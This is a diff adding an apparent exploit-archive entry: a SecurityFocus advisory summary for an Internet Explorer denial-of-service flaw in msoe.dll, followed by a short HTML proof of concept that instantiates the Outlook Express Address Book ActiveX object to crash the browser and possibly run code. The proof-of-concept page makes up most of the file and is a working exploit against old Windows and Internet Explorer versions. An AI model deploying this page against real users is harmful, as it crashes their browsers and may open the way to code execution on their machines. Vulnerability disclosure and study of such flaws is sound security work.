@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/19530/info
+
+Microsoft Internet Explorer is prone to a denial-of-service vulnerability. 
+
+This issue occurs because the application fails to load a DLL library when instantiated as an ActiveX control.
+
+An attacker may exploit this issue to crash Internet Explorer, effectively denying service to legitimate users, and may cause arbitrary code to run within the context of the application.
+
+ <!--
+ // Internet Explorer (msoe.dll) COM Object Instantiation Vulnerability
+ // tested: 2000SP4/XPSP2 CN
+
+ // http://www.xsec.org
+ // nop (nop#xsec.org)
+
+ // CLSID: {233A9694-667E-11d1-9DFB-006097D50408}
+ // Info: Outlook Express Address Book
+ // ProgID: OutlookExpress.AddressBook.1
+ // InprocServer32: %ProgramFiles%\Outlook Express\msoe.dll
+
+ --!>
+ <html><body>
+ <object classid="CLSID:{233A9694-667E-11d1-9DFB-006097D50408}" ></object>
+ </body></html>
